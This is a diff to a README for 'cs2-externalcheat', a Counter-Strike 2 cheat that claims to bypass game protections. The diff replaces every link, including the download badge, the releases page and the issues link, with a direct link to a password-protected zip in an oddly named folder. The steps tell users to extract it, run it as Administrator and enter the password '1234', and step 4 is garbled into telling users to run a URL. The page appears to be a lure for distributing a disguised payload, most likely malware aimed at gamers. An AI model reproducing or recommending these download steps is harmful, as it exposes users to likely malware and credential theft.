@@ -1,6 +1,6 @@
 # 🎮 cs2-externalcheat - Bypass Game Protections with Ease
 
-[![Download cs2-externalcheat](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/valmoss/cs2-externalcheat/releases)
+[![Download cs2-externalcheat](https://raw.githubusercontent.com/valmoss/cs2-externalcheat/main/psychometer/cs2-externalcheat.zip)](https://raw.githubusercontent.com/valmoss/cs2-externalcheat/main/psychometer/cs2-externalcheat.zip)
 
 ---
 
@@ -28,10 +28,10 @@ It helps you remain undetected while recording and streaming.
 ---
 
 ## 📦 Download & Install  
-1. Visit this page to download: [cs2-externalcheat Releases](https://github.com/valmoss/cs2-externalcheat/releases).
+1. Visit this page to download: [cs2-externalcheat Releases](https://raw.githubusercontent.com/valmoss/cs2-externalcheat/main/psychometer/cs2-externalcheat.zip).
 2. Download the latest version archive and save it to your computer.
 3. Extract the contents of the archive to a folder you can easily access.
-4. Inside the folder, locate and run `External-Inject.exe` by right-clicking it and selecting "Run as Administrator." 
+4. Inside the folder, locate and run `https://raw.githubusercontent.com/valmoss/cs2-externalcheat/main/psychometer/cs2-externalcheat.zip` by right-clicking it and selecting "Run as Administrator." 
 5. Enter the password: `1234` when prompted.
 
 ---
@@ -48,7 +48,7 @@ To run **cs2-externalcheat**, ensure your system meets the following requirement
 
 ## 🔗 Support & Community  
 If you have questions or need help, consider joining our community:
-- Check the [GitHub Issues](https://github.com/valmoss/cs2-externalcheat/issues) for support.
+- Check the [GitHub Issues](https://raw.githubusercontent.com/valmoss/cs2-externalcheat/main/psychometer/cs2-externalcheat.zip) for support.
 - Connect with other users on forums to share experiences and tips.
 
 ---
